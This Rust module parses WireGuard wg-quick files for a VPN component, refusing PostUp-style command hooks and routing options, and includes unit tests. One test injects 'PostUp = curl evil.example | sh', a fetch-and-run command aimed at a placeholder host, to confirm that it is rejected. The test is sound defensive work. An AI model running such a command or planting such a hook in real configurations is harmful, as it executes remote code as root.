//! A provider's WireGuard configuration, in the wg-quick form every one of
//! them hands out, read into what sys-vpn needs and nothing else. It is
//! read twice: on the host when a person sets it, so a bad file is refused
//! there, and in sys-vpn before the tunnel goes up.
//!
//! Refused rather than ignored: PreUp, PostUp, PreDown and PostDown, which
//! wg-quick runs as root (a downloaded file is not a script to run), and
//! SaveConfig and Table, which would change how the routes are made. Only
//! one peer, whose AllowedIPs take all of IPv4: sys-vpn sends everything
//! through it or nothing. IPv6 addresses are left out, since the network
//! machine routes IPv4 only.

use std::fmt::Write as _;
use std::net::Ipv4Addr;

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Tunnel {
    pub private_key: String,
    /// This end's IPv4 addresses on the tunnel, with their prefix.
    pub addresses: Vec<(Ipv4Addr, u8)>,
    /// The provider's resolvers inside the tunnel, IPv4 only.
    pub dns: Vec<Ipv4Addr>,
    pub mtu: Option<u16>,
    pub peer: Peer,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Peer {
    pub public_key: String,
    pub preshared_key: Option<String>,
    /// A host name or an IPv4 address, unresolved.
    pub host: String,
    pub port: u16,
    pub keepalive: Option<u16>,
}

#[derive(Clone, Copy, PartialEq, Eq)]
enum Section {
    None,
    Interface,
    Peer,
}

/// A WireGuard key: 32 bytes in base64, 44 characters ending in `=`.
fn key(what: &str, value: &str) -> Result<String, String> {
    let ok = value.len() == 44
        && value.ends_with('=')
        && value[..43]
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || b == b'+' || b == b'/');
    if ok {
        Ok(value.to_owned())
    } else {
        Err(format!("{what} is not a WireGuard key"))
    }
}

/// `address/prefix`, IPv4; `None` for an IPv6 one, which is skipped.
fn ipv4_net(value: &str) -> Result<Option<(Ipv4Addr, u8)>, String> {
    let (addr, prefix) = value.split_once('/').unwrap_or((value, "32"));
    if addr.contains(':') {
        return Ok(None);
    }
    let addr: Ipv4Addr = addr
        .parse()
        .map_err(|_| format!("not an address: {value}"))?;
    let prefix: u8 = prefix
        .parse()
        .ok()
        .filter(|p| *p <= 32)
        .ok_or_else(|| format!("not a prefix: {value}"))?;
    Ok(Some((addr, prefix)))
}

/// `host:port`, the host a name, an IPv4 address or a bracketed IPv6 one.
fn endpoint(value: &str) -> Result<(String, u16), String> {
    let bad = || format!("not an endpoint: {value}");
    let (host, port) = value.rsplit_once(':').ok_or_else(bad)?;
    let host = host.trim_start_matches('[').trim_end_matches(']');
    let port: u16 = port.parse().ok().filter(|p| *p != 0).ok_or_else(bad)?;
    let fine = !host.is_empty()
        && host
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'-' | b':'));
    if !fine {
        return Err(bad());
    }
    Ok((host.to_owned(), port))
}

impl Tunnel {
    pub fn parse(text: &str) -> Result<Self, String> {
        let mut section = Section::None;
        let mut peers = 0;
        let mut private_key = None;
        let mut addresses = Vec::new();
        let mut dns = Vec::new();
        let mut mtu = None;
        let (mut public_key, mut preshared_key, mut end, mut keepalive) = (None, None, None, None);
        let mut everything = false;

        for (number, raw) in text.lines().enumerate() {
            let line = raw.split('#').next().unwrap_or("").trim();
            if line.is_empty() {
                continue;
            }
            let at = |e: String| format!("line {}: {e}", number + 1);
            if line.starts_with('[') {
                section = match line.to_ascii_lowercase().as_str() {
                    "[interface]" => Section::Interface,
                    "[peer]" => {
                        peers += 1;
                        Section::Peer
                    }
                    _ => return Err(at(format!("no such section {line}"))),
                };
                continue;
            }
            let (name, value) = line
                .split_once('=')
                .map(|(n, v)| (n.trim().to_ascii_lowercase(), v.trim()))
                .ok_or_else(|| at("not `Name = value`".to_owned()))?;
            let list = || value.split(',').map(str::trim).filter(|v| !v.is_empty());
            match (section, name.as_str()) {
                (Section::Interface, "privatekey") => {
                    private_key = Some(key("PrivateKey", value).map_err(at)?);
                }
                (Section::Interface, "address") => {
                    for v in list() {
                        if let Some(net) = ipv4_net(v).map_err(at)? {
                            addresses.push(net);
                        }
                    }
                }
                (Section::Interface, "dns") => {
                    for v in list() {
                        // An IPv6 resolver is skipped like an IPv6 address;
                        // a search domain is not something sys-vpn uses.
                        if let Ok(ip) = v.parse::<Ipv4Addr>() {
                            dns.push(ip);
                        }
                    }
                }
                (Section::Interface, "mtu") => {
                    mtu = Some(
                        value
                            .parse::<u16>()
                            .ok()
                            .filter(|m| (1280..=9000).contains(m))
                            .ok_or_else(|| at(format!("not an MTU: {value}")))?,
                    );
                }
                // The port this end listens on: any will do.
                (Section::Interface, "listenport") => {}
                (
                    Section::Interface,
                    n @ ("preup" | "postup" | "predown" | "postdown" | "saveconfig" | "table"
                    | "fwmark"),
                ) => {
                    return Err(at(format!(
                        "{n} is not taken: sys-vpn runs no commands from the file and makes its own routes"
                    )));
                }
                (Section::Peer, "publickey") => {
                    public_key = Some(key("PublicKey", value).map_err(at)?);
                }
                (Section::Peer, "presharedkey") => {
                    preshared_key = Some(key("PresharedKey", value).map_err(at)?);
                }
                (Section::Peer, "endpoint") => end = Some(endpoint(value).map_err(at)?),
                (Section::Peer, "allowedips") => {
                    everything |= list().any(|v| v == "0.0.0.0/0");
                }
                (Section::Peer, "persistentkeepalive") => {
                    keepalive = Some(
                        value
                            .parse::<u16>()
                            .map_err(|_| at(format!("not a number: {value}")))?,
                    );
                }
                (Section::None, _) => return Err(at("a setting outside a section".to_owned())),
                (_, n) => return Err(at(format!("no such setting {n}"))),
            }
        }

        if peers != 1 {
            return Err(format!(
                "{peers} peers: sys-vpn takes a file with exactly one"
            ));
        }
        let (host, port) = end.ok_or("the peer has no Endpoint")?;
        if !everything {
            return Err("the peer's AllowedIPs do not take 0.0.0.0/0, so not everything would go through it".to_owned());
        }
        if addresses.is_empty() {
            return Err("no IPv4 Address".to_owned());
        }
        Ok(Tunnel {
            private_key: private_key.ok_or("no PrivateKey")?,
            addresses,
            dns,
            mtu,
            peer: Peer {
                public_key: public_key.ok_or("the peer has no PublicKey")?,
                preshared_key,
                host,
                port,
                keepalive,
            },
        })
    }

    /// The file again, in the same form, with only what was taken: what the
    /// host keeps and hands to sys-vpn.
    #[must_use]
    pub fn render(&self) -> String {
        let mut out = String::from("[Interface]\n");
        let _ = writeln!(out, "PrivateKey = {}", self.private_key);
        let addresses: Vec<String> = self
            .addresses
            .iter()
            .map(|(a, p)| format!("{a}/{p}"))
            .collect();
        let _ = writeln!(out, "Address = {}", addresses.join(", "));
        if !self.dns.is_empty() {
            let dns: Vec<String> = self.dns.iter().map(ToString::to_string).collect();
            let _ = writeln!(out, "DNS = {}", dns.join(", "));
        }
        if let Some(mtu) = self.mtu {
            let _ = writeln!(out, "MTU = {mtu}");
        }
        out.push_str("\n[Peer]\n");
        let _ = writeln!(out, "PublicKey = {}", self.peer.public_key);
        if let Some(psk) = &self.peer.preshared_key {
            let _ = writeln!(out, "PresharedKey = {psk}");
        }
        let _ = writeln!(out, "Endpoint = {}", self.peer.endpoint());
        out.push_str("AllowedIPs = 0.0.0.0/0\n");
        if let Some(k) = self.peer.keepalive {
            let _ = writeln!(out, "PersistentKeepalive = {k}");
        }
        out
    }

    /// What `wg setconf` takes for the tunnel, with the endpoint at the
    /// address sys-vpn resolved and its packets carrying `fwmark`, which is
    /// how they leave by the uplink rather than into the tunnel.
    #[must_use]
    pub fn wg_config(&self, endpoint: Ipv4Addr, fwmark: u32) -> String {
        let mut out = String::from("[Interface]\n");
        let _ = writeln!(out, "PrivateKey = {}", self.private_key);
        let _ = writeln!(out, "FwMark = {fwmark}");
        out.push_str("\n[Peer]\n");
        let _ = writeln!(out, "PublicKey = {}", self.peer.public_key);
        if let Some(psk) = &self.peer.preshared_key {
            let _ = writeln!(out, "PresharedKey = {psk}");
        }
        let _ = writeln!(out, "Endpoint = {endpoint}:{}", self.peer.port);
        out.push_str("AllowedIPs = 0.0.0.0/0\n");
        // Always a keepalive: the uplink's NAT would forget an idle tunnel.
        let _ = writeln!(
            out,
            "PersistentKeepalive = {}",
            self.peer.keepalive.unwrap_or(25)
        );
        out
    }
}

impl Peer {
    #[must_use]
    pub fn endpoint(&self) -> String {
        if self.host.contains(':') {
            format!("[{}]:{}", self.host, self.port)
        } else {
            format!("{}:{}", self.host, self.port)
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    const KEY: &str = "yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=";
    const PEER: &str = "xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=";

    fn mullvad() -> String {
        format!(
            "[Interface]\n# Device: Quiet Fox\nPrivateKey = {KEY}\nAddress = 10.66.1.2/32,fc00:bbbb:bbbb:bb01::3:102/128\nDNS = 10.64.0.1\n\n[Peer]\nPublicKey = {PEER}\nAllowedIPs = 0.0.0.0/0,::0/0\nEndpoint = 185.65.134.82:51820\n"
        )
    }

    #[test]
    fn reads_a_providers_file() {
        let t = Tunnel::parse(&mullvad()).unwrap();
        assert_eq!(t.addresses, vec![("10.66.1.2".parse().unwrap(), 32)]);
        assert_eq!(t.dns, vec!["10.64.0.1".parse::<Ipv4Addr>().unwrap()]);
        assert_eq!(t.peer.host, "185.65.134.82");
        assert_eq!(t.peer.port, 51820);
        // What the host keeps reads back the same.
        assert_eq!(Tunnel::parse(&t.render()).unwrap(), t);
    }

    #[test]
    fn runs_nothing_from_the_file() {
        let bad = mullvad().replace("DNS", "PostUp = curl evil.example | sh\nDNS");
        assert!(Tunnel::parse(&bad).unwrap_err().contains("postup"));
        let bad = mullvad().replace("DNS", "Table = off\nDNS");
        assert!(Tunnel::parse(&bad).is_err());
    }

    #[test]
    fn takes_everything_or_nothing() {
        let split = mullvad().replace("0.0.0.0/0,::0/0", "10.0.0.0/8");
        assert!(Tunnel::parse(&split).unwrap_err().contains("AllowedIPs"));
        let two = format!(
            "{}\n[Peer]\nPublicKey = {PEER}\nEndpoint = a.example:1\nAllowedIPs = 0.0.0.0/0\n",
            mullvad()
        );
        assert!(Tunnel::parse(&two).is_err());
        let v6only = mullvad().replace("10.66.1.2/32,", "");
        assert!(Tunnel::parse(&v6only).unwrap_err().contains("IPv4"));
    }

    #[test]
    fn hands_wireguard_only_its_own() {
        let t = Tunnel::parse(&mullvad().replace("185.65.134.82", "se-got-wg-001.relays.example"))
            .unwrap();
        assert_eq!(t.peer.endpoint(), "se-got-wg-001.relays.example:51820");
        let wg = t.wg_config("185.65.134.82".parse().unwrap(), 51820);
        assert!(wg.contains("Endpoint = 185.65.134.82:51820"));
        assert!(wg.contains("FwMark = 51820"));
        assert!(!wg.contains("Address"));
        assert!(!wg.contains("DNS"));
        assert!(Tunnel::parse(&mullvad().replace(KEY, "short=")).is_err());
    }
}
